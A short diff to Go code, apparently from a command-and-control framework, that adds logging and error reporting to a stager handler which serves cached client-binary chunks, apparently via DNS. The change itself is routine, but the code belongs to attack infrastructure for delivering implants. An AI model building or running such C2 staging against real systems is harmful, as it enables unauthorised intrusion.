@@ -1298,6 +1298,10 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 	// The cache should have been pushed during DNS server checkin
 	if masterClient != nil && c2.db != nil {
 		// Look for cached client binary
+		if !isDuplicate {
+			logf("[C2] 🔍 Checking stager_chunk_cache for any cached binaries...")
+		}
+
 		rows, err := c2.db.db.Query(`
 			SELECT DISTINCT client_binary_id, COUNT(*) as chunk_count
 			FROM stager_chunk_cache
@@ -1306,7 +1310,9 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 			LIMIT 1
 		`)
 
-		if err == nil {
+		if err != nil {
+			logf("[C2] ⚠️  Error querying stager_chunk_cache: %v", err)
+		} else {
 			defer rows.Close()
 			if rows.Next() {
 				var clientBinaryID string
